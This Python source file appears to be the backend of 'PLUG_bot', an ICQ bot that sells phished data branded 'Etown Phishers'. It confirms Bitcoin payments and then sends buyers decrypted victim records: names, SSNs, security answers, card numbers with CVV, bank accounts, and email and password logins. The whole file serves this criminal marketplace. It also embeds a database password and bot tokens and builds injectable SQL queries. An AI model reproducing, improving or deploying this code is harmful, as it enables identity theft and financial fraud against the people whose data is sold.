import os
import mysql.connector
from coinpayments import CoinPaymentsAPI
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import hashlib
import base64
import _thread
import time
import datetime
from blockchain import blockexplorer
from icq.bot import ICQBot

conn = mysql.connector.connect(host='localhost', database='bin', user='binbot', password='football!!!')
query_conn = conn.cursor(buffered=True)

NAME = "PLUG_bot"
VERSION = "0.0.19"
# TOKEN = "001.3907104052.2241892471:747224570"
TOKEN = "001.0843420055.4259868664:747300945"
OWNER = "000000000"

LOG_FILES = False
LOG_DATABASE = True

LOG_PATTERNS = {}

bot = ICQBot(token=TOKEN, name=NAME, version=VERSION)

__key__ = hashlib.sha256(b'bin-bot-encrypt!').digest()

def encrypt(raw):
    BS = AES.block_size
    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)

    raw = base64.b64encode(pad(raw).encode('utf8'))
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key= __key__, mode= AES.MODE_CFB,iv= iv)
    return base64.b64encode(iv + cipher.encrypt(raw))

def decrypt(enc):
    unpad = lambda s: s[:-ord(s[-1:])]

    enc = base64.b64decode(enc)
    iv = enc[:AES.block_size]
    cipher = AES.new(__key__, AES.MODE_CFB, iv)
    return unpad(base64.b64decode(cipher.decrypt(enc[AES.block_size:])).decode('utf8'))


# log patterns
def log_pattern():
    global LOG_PATTERNS

    LOG_PATTERNS = {}

    try:
        query_conn.execute("select id, content, params from log where 1 ")
        l_list = query_conn.fetchall()

        for ptn in l_list:
            LOG_PATTERNS[ptn[0]] = {'content': '\n'.join(ptn[1].split('\\n')), 'params': ptn[2]}
    except:
        print('thread log pattern error occurs.')

    return

# chat & log
def log_output(index, command, aimId, flag, result, chats=[], insert_command=True):
    global LOG_FILES, LOG_DATABASE

    time_now = int((datetime.datetime.utcnow() - datetime.datetime(1970, 1, 1)).total_seconds())

    try:
        if LOG_FILES == True:
            sample_text = "index=>%s,time=>%s,command=>%s,aimId=>%s,flag=>%s,result=>%s@#@"
            file_name = "../var/www/html/logs/" + datetime.datetime.now().strftime("%Y-%m-%d") + ".txt"
            result_text = sample_text % (index, datetime.datetime.now().strftime("%H:%M:%S"), command, aimId, flag, result)
            with open(file_name, "a") as log_file:
                log_file.write(result_text)
        
        if LOG_DATABASE == True:
            if insert_command == True:
                query = "insert into `chat` (`uin`, `time`, `log_id`, `log_params`, `command`) values ('%s', '%s', '0', '', '/%s')" % (aimId, time_now, command)
                query_conn.execute(query)
                conn.commit()
            if len(chats) > 0:
                for chat in chats:
                    if len(chat) > 1:
                        query = 'insert into `chat` (`uin`, `time`, `log_id`, `log_params`, `command`) values ("%s", "%s", "%s", "%s", "")' % (aimId, time_now, chat[0], chat[1])
                        query_conn.execute(query)
                        conn.commit()
    except:
        print('thread log output error occurs.')


# get order from product
def get_order(customer_id, product_type, product_id):
    query = "select id from `order` where uin=%s and product_type='%s' and product_id like '%s' order by id desc" % (str(customer_id), product_type, ('%'+str(product_id)+'%'))
    query_conn.execute(query)
    f_list = query_conn.fetchone()
    return f_list[0]


def get_payment_fullz(customer_id, deposit_address):
    order_id = 0
    result_text = ""
    sample_text = "————————————————\nPRODUCT ID : %s\n+ ------------- Etown Phishers -------------+\n+ ------------------------------------------+\n+ Personal Information\n%s%s%s%s%s%s%s%s%s+ ------------------------------------------+\n+ Billing Information\n%s%s%s%s%s%s%s%s+ ------------------------------------------+\n+ Account Information\n%s%s+ ------------------------------------------+\n+ Victim Information\n%s%s%s%s%s+ ------------------------------------------+\n\n"
    query = "select full_name, birth_date, address, zip, country, phone, ssn, secu_question, secu_answer, card_bin, card_bank, card_type, card_number, expire_date, cvv, account_number, sortcode, user_name, password, ip_address, location, user_agent, browser, platform, id from fullz where status='confirm' and lock_customer=%s and deposit_address='%s'" % (customer_id, deposit_address)
    query_conn.execute(query)
    f_list = query_conn.fetchall()
    for f in f_list:
        if order_id == 0:
            order_id = get_order(customer_id, 'Fullz', f[24])
        result_text += sample_text % (
            f[24], decrypt(f[0]), decrypt(f[1]), decrypt(f[2]), decrypt(f[3]), decrypt(f[4]), decrypt(f[5]), decrypt(f[6]),
            decrypt(f[7]), decrypt(f[8]), decrypt(f[9]), decrypt(f[10]), decrypt(f[11]), decrypt(f[12]), decrypt(f[13]),
            decrypt(f[14]), decrypt(f[15]), decrypt(f[16]), decrypt(f[17]), decrypt(f[18]), decrypt(f[19]),
            decrypt(f[20]),
            decrypt(f[21]), decrypt(f[22]), decrypt(f[23]))
    result_text = ("ORDER ID : %s\n" % order_id) + result_text
    return result_text

def get_payment_dead_fullz(customer_id, deposit_address):
    order_id = 0
    result_text = ""
    sample_text = "————————————————\nPRODUCT ID : %s\n+ ------------- Etown Phishers -------------+\n+ ------------------------------------------+\n+ Personal Information\n%s%s%s%s%s%s%s%s%s+ ------------------------------------------+\n+ Billing Information\n%s%s%s%s%s%s%s%s+ ------------------------------------------+\n+ Account Information\n%s%s+ ------------------------------------------+\n+ Victim Information\n%s%s%s%s%s+ ------------------------------------------+\n\n"
    query = "select full_name, birth_date, address, zip, country, phone, ssn, secu_question, secu_answer, card_bin, card_bank, card_type, card_number, expire_date, cvv, account_number, sortcode, user_name, password, ip_address, location, user_agent, browser, platform, id from dead_fullz where status='confirm' and lock_customer=%s and deposit_address='%s'" % (customer_id, deposit_address)
    query_conn.execute(query)
    f_list = query_conn.fetchall()
    for f in f_list:
        if order_id == 0:
            order_id = get_order(customer_id, 'dead_fullz', f[24])
        result_text += sample_text % (
            f[24], decrypt(f[0]), decrypt(f[1]), decrypt(f[2]), decrypt(f[3]), decrypt(f[4]), decrypt(f[5]), decrypt(f[6]),
            decrypt(f[7]), decrypt(f[8]), decrypt(f[9]), decrypt(f[10]), decrypt(f[11]), decrypt(f[12]), decrypt(f[13]),
            decrypt(f[14]), decrypt(f[15]), decrypt(f[16]), decrypt(f[17]), decrypt(f[18]), decrypt(f[19]),
            decrypt(f[20]),
            decrypt(f[21]), decrypt(f[22]), decrypt(f[23]))
    result_text = ("ORDER ID : %s\n" % order_id) + result_text
    return result_text

def get_payment_pp(customer_id, deposit_address):
    order_id = 0
    result_text = ""
    sample_text = "————————————————\nPRODUCT ID : %s\n+ ----------- Login Information ------------+\n+ ------------------------------------------+\n%s%s+ ------------------------------------------+\n%s%s%s%s%s+ ------------------------------------------+\n\n"
    query = "select email, password, ip_address, location, user_agent, browser, platform, id from pp where status='confirm' and lock_customer=%s and deposit_address='%s'" % (customer_id, deposit_address)
    query_conn.execute(query)
    f_list = query_conn.fetchall()
    for f in f_list:
        if order_id == 0:
            order_id = get_order(customer_id, 'PP', f[7])
        result_text += sample_text % (
            f[7], decrypt(f[0]), decrypt(f[1]), decrypt(f[2]), decrypt(f[3]), decrypt(f[4]), decrypt(f[5]), decrypt(f[6]))
    result_text = ("ORDER ID : %s\n" % order_id) + result_text
    return result_text


def main():
    try:
        time_now = int((datetime.datetime.utcnow() - datetime.datetime(1970, 1, 1)).total_seconds())

        # confirm -> on
        unlock_time = time_now - 7200
        query = "update pp set status='on', lock_time=0, lock_customer='', deposit_address='' where status='confirm' and lock_time<%s" % unlock_time
        query_conn.execute(query)
        conn.commit()
        update_count = query_conn.rowcount
        if(update_count > 0):
            log_output('200', 'thread', '', 'success', ('%d update pp status=on from status=confirm' % update_count), [], False)
        query = "update fullz set status='on', lock_time=0, lock_customer='', deposit_address='' where status='confirm' and lock_time<%s" % unlock_time
        query_conn.execute(query)
        conn.commit()
        update_count = query_conn.rowcount
        if(update_count > 0):
            log_output('201', 'thread', '', 'success', ('%d update fullz status=on from status=confirm' % update_count), [], False)
        query = "update dead_fullz set status='on', lock_time=0, lock_customer='', deposit_address='' where status='confirm' and lock_time<%s" % unlock_time
        query_conn.execute(query)
        conn.commit()
        update_count = query_conn.rowcount
        if(update_count > 0):
            log_output('202', 'thread', '', 'success', ('%d update dead_fullz status=on from status=confirm' % update_count), [], False)

        # ongoing Y -> N
        query = "update `order` set ongoing='N' where ongoing='Y' and `time`<%s" % unlock_time
        query_conn.execute(query)
        conn.commit()
        update_count = query_conn.rowcount
        if(update_count > 0):
            log_output('224', 'thread', '', 'success', ('%d update order ongoing=N' % update_count), [], False)

        # delete deposit
        query = "delete from deposit where start_time<%s" % unlock_time
        query_conn.execute(query)
        conn.commit()
        delete_count = query_conn.rowcount
        if(delete_count > 0):
            log_output('203', 'thread', '', 'success', ('%d delete deposit' % delete_count), [], False)

        # lock -> on
        unlock_time = time_now - 1800
        query = "update pp set status='on', lock_time=0, lock_customer='' where status='lock' and lock_time<%s" % unlock_time
        query_conn.execute(query)
        conn.commit()
        update_count = query_conn.rowcount
        if(update_count > 0):
            log_output('204', 'thread', '', 'success', ('%d update pp status=on from status=lock' % update_count), [], False)
        query = "update fullz set status='on', lock_time=0, lock_customer='' where status='lock' and lock_time<%s" % unlock_time
        query_conn.execute(query)
        conn.commit()
        update_count = query_conn.rowcount
        if(update_count > 0):
            log_output('205', 'thread', '', 'success', ('%d update fullz status=on from status=lock' % update_count), [], False)
        query = "update dead_fullz set status='on', lock_time=0, lock_customer='' where status='lock' and lock_time<%s" % unlock_time
        query_conn.execute(query)
        conn.commit()
        update_count = query_conn.rowcount
        if(update_count > 0):
            log_output('206', 'thread', '', 'success', ('%d update dead_fullz status=on from status=lock' % update_count), [], False)

        # dead -> on
        dead_time = time_now - 3600 * 72
        query = "update dead_fullz set status='on', lock_time=0, lock_customer='', deposit_address='' where status='dead' and lock_time<%s" % dead_time
        query_conn.execute(query)
        conn.commit()
        update_count = query_conn.rowcount
        if(update_count > 0):
            log_output('209', 'thread', uin, 'success', ('%d update dead_fullz status=on from status=dead' % update_count), [], False)
        

        # each deposit
        query_conn.execute("select * from deposit where 1")
        d_list = query_conn.fetchall()

        for deposit in d_list:
            id, bin_type, deposit_address, deposit_amount, paid_amount, paid_time, uin, start_time = deposit
            time_now = int((datetime.datetime.utcnow() - datetime.datetime(1970, 1, 1)).total_seconds())
            transaction_info = blockexplorer.get_address(address=deposit_address)
            tran = transaction_info.transactions
            result_text = ""

            if len(tran) > 0 and tran[0].time > time_now - 7200:
                t_list = transaction_info.transactions[0].outputs
                t_time = transaction_info.transactions[0].time
                for t in t_list:
                    if t.address == deposit_address:
                        amount = int(t.value)

                if amount > 0:
                    if int(amount) >= int(float(deposit_amount) * 100000000):
                        if bin_type == "Fullz":
                            result_text = get_payment_fullz(uin, deposit_address)
                            query = "select full_name, birth_date, address, zip, country, phone, ssn, secu_question, secu_answer, card_bin, card_bank, card_type, card_number, expire_date, cvv, account_number, sortcode, user_name, password, ip_address, location, user_agent, browser, platform, type from fullz where deposit_address='%s' and lock_customer=%s and status='confirm'" % (
                                deposit_address, uin)
                            query_conn.execute(query)
                            f_list = query_conn.fetchall()
                            for f in f_list:
                                full_name, birth_date, address, zip, country, phone, ssn, secu_question, secu_answer, card_bin, card_bank, card_type, card_number, expire_date, cvv, account_number, sortcode, user_name, password, ip, location, user_agent, browser, platform, type = f[0], f[1], f[2], f[3], f[4], f[5], f[6], f[7], f[8], f[9], f[10], f[11], f[12], f[13], f[14], f[15], f[16], f[17], f[18], f[19], f[20], f[21], f[22], f[23], f[24]
                                insert_query = "insert into `dead_fullz` (`full_name`, `birth_date`, `address`, `zip`, `country`, `phone`, `ssn`, `secu_question`, `secu_answer`, `card_bin`, `card_bank`, `card_type`, `card_number`, `expire_date`, `cvv`, `account_number`, `sortcode`, `user_name`, `password`, `ip_address`, `location`, `user_agent`, `browser`, `platform`, `type`, `status`, `lock_time`) values ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', 'dead', '%s')" % (full_name, birth_date, address, zip, country, phone, ssn, secu_question, secu_answer, card_bin, card_bank, card_type, card_number, expire_date, cvv, account_number, sortcode, user_name, password, ip, location, user_agent, browser, platform, type, time_now)
                                query_conn.execute(insert_query)
                                conn.commit()
                                insert_count = query_conn.rowcount
                                log_output('207', 'thread', uin, 'success', ('%d insert dead_fullz status=dead' % insert_count), [], False)
                            query = "delete from fullz where deposit_address='%s' and lock_customer=%s and status='confirm'" % (
                                deposit_address, uin)
                            query_conn.execute(query)
                            conn.commit()
                            delete_count = query_conn.rowcount
                            if(delete_count > 0):
                                log_output('208', 'thread', uin, 'success', ('%d delete fullz' % delete_count), [], False)
                        elif bin_type == "dead_fullz":
                            result_text = get_payment_dead_fullz(uin, deposit_address)
                            query = "delete from dead_fullz where deposit_address='%s' and lock_customer=%s and status='confirm'" % (
                                deposit_address, uin)
                            query_conn.execute(query)
                            conn.commit()
                            delete_count = query_conn.rowcount
                            if(delete_count > 0):
                                log_output('210', 'thread', uin, 'success', ('%d delete dead_fullz' % delete_count), [], False)
                        elif bin_type == "PP":
                            result_text = get_payment_pp(uin, deposit_address)
                            query = "delete from pp where deposit_address='%s' and lock_customer=%s and status='confirm'" % (
                                deposit_address, uin)
                            query_conn.execute(query)
                            conn.commit()
                            delete_count = query_conn.rowcount
                            if(delete_count > 0):
                                log_output('211', 'thread', uin, 'success', ('%d delete pp' % delete_count), [], False)

                        # `order` success = 'Y'
                        query = "update `order` set `success`='Y' where uin=%s and time=%s and btc=%s" % (uin, start_time, deposit_amount)
                        query_conn.execute(query)
                        conn.commit()
                        update_count = query_conn.rowcount
                        if(update_count > 0):
                            log_output('225', 'thread', uin, 'success', ('%d update order success=Y' % update_count), [], False)

                        # `deposit` delete
                        query = "delete from deposit where id=%s" % id
                        query_conn.execute(query)
                        conn.commit()
                        delete_count = query_conn.rowcount
                        if(delete_count > 0):
                            log_output('212', 'thread', uin, 'success', ('%d delete deposit' % delete_count), [], False)
                    else:
                        if paid_amount > 0 and t_time != paid_time:
                            total_paid = int(amount + paid_amount * 100000000)
                            if total_paid >= int(float(deposit_amount) * 100000000):
                                if bin_type == "Fullz":
                                    result_text = get_payment_fullz(uin, deposit_address)
                                    query = "select full_name, birth_date, address, zip, country, phone, ssn, secu_question, secu_answer, card_bin, card_bank, card_type, card_number, expire_date, cvv, account_number, sortcode, user_name, password, ip_address, location, user_agent, browser, platform, type from fullz where deposit_address='%s' and lock_customer=%s and status='confirm'" % (
                                        deposit_address, uin)
                                    query_conn.execute(query)
                                    f_list = query_conn.fetchall()
                                    for f in f_list:
                                        full_name, birth_date, address, zip, country, phone, ssn, secu_question, secu_answer, card_bin, card_bank, card_type, card_number, expire_date, cvv, account_number, sortcode, user_name, password, ip, location, user_agent, browser, platform, type = f[0], f[1], f[2], f[3], f[4], f[5], f[6], f[7], f[8], f[9], f[10], f[11], f[12], f[13], f[14], f[15], f[16], f[17], f[18], f[19], f[20], f[21], f[22], f[23], f[24]
                                        insert_query = "insert into `dead_fullz` (`full_name`, `birth_date`, `address`, `zip`, `country`, `phone`, `ssn`, `secu_question`, `secu_answer`, `card_bin`, `card_bank`, `card_type`, `card_number`, `expire_date`, `cvv`, `account_number`, `sortcode`, `user_name`, `password`, `ip_address`, `location`, `user_agent`, `browser`, `platform`, `type`, `status`, `lock_time`) values ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', 'dead', '%s')" % (full_name, birth_date, address, zip, country, phone, ssn, secu_question, secu_answer, card_bin, card_bank, card_type, card_number, expire_date, cvv, account_number, sortcode, user_name, password, ip, location, user_agent, browser, platform, type, time_now)
                                        query_conn.execute(query)
                                        conn.commit()
                                        insert_count = query_conn.rowcount
                                        log_output('213', 'thread', uin, 'success', ('%d insert dead_fullz status=dead' % insert_count), [], False)
                                    query = "delete from fullz where deposit_address='%s' and lock_customer=%s and status='confirm'" % (
                                        deposit_address, uin)
                                    query_conn.execute(query)
                                    conn.commit()
                                    delete_count = query_conn.rowcount
                                    if(delete_count > 0):
                                        log_output('214', 'thread', uin, 'success', ('%d delete fullz' % delete_count), [], False)
                                elif bin_type == "dead_fullz":
                                    result_text = get_payment_dead_fullz(uin, deposit_address)
                                    query = "delete from dead_fullz where deposit_address='%s' and lock_customer=%s and status='confirm'" % (
                                        deposit_address, uin)
                                    query_conn.execute(query)
                                    conn.commit()
                                    delete_count = query_conn.rowcount
                                    if(delete_count > 0):
                                        log_output('216', 'thread', uin, 'success', ('%d delete dead_fullz' % delete_count), [], False)
                                elif bin_type == "PP":
                                    result_text = get_payment_pp(uin, deposit_address)
                                    query = "delete from pp where deposit_address='%s' and lock_customer=%s and status='confirm'" % (
                                        deposit_address, uin)
                                    query_conn.execute(query)
                                    conn.commit()
                                    delete_count = query_conn.rowcount
                                    if(delete_count > 0):
                                        log_output('217', 'thread', uin, 'success', ('%d delete pp' % delete_count), [], False)

                                # `order` success = 'Y'
                                query = "update `order` set `success`='Y' where uin=%s and time=%s and btc=%s" % (uin, start_time, deposit_amount)
                                query_conn.execute(query)
                                conn.commit()
                                update_count = query_conn.rowcount
                                if(update_count > 0):
                                    log_output('226', 'thread', uin, 'success', ('%d update order success=Y' % update_count), [], False)

                                # `deposit` delete
                                query = "delete from deposit where id=%s" % id
                                query_conn.execute(query)
                                conn.commit()
                                delete_count = query_conn.rowcount
                                if(delete_count > 0):
                                    log_output('218', 'thread', uin, 'success', ('%d delete deposit' % delete_count), [], False)
                            else:
                                pay_amount = "{:.8f}".format(total_paid)
                                query = "update deposit set paid_amount=%s where id=%s" % (pay_amount, id)
                                query_conn.execute(query)
                                conn.commit()
                                update_count = query_conn.rowcount
                                if(update_count > 0):
                                    log_output('219', 'thread', uin, 'success', ('update paid_amount=%s deposit id=%s' % (pay_amount, id)), [], False)
                                result_text = LOG_PATTERNS[39]['content'] % (deposit_amount, pay_amount) #39
                        else:
                            pay_amount = "{:.8f}".format(float(amount / 100000000))
                            # rest_amount = "{:.8f}".format(float(deposit_amount) - float(amount / 100000000))
                            query = "update deposit set paid_amount=%s, paid_time=%s where id=%s" % (pay_amount, t_time, id)
                            query_conn.execute(query)
                            conn.commit()
                            update_count = query_conn.rowcount
                            if(update_count > 0):
                                log_output('220', 'thread', uin, 'success', ('update paid_amount=%s deposit id=%s' % (pay_amount, id)), [], False)
                            if paid_time == 0:
                                result_text = LOG_PATTERNS[40]['content'] % (deposit_amount, pay_amount) #40

                else:
                    # log_output('221', 'thread', uin, 'fail', 'not payment')
                    print("didn't find payment.")
            else:
                # log_output('222', 'thread', uin, 'fail', 'not payment')
                print("Didn't find payment")
            if result_text != "":
                log_output('223', 'thread', uin, 'success', 'not payment', [[0, result_text]], False)
                bot.send_im(target=uin, message=result_text)
    except:
        print('thread main error occurs.')

if __name__ == '__main__':
    # get log patterns
    log_pattern()

    while True:
        # main
        main()

        # 1s sleep
        time.sleep(1)

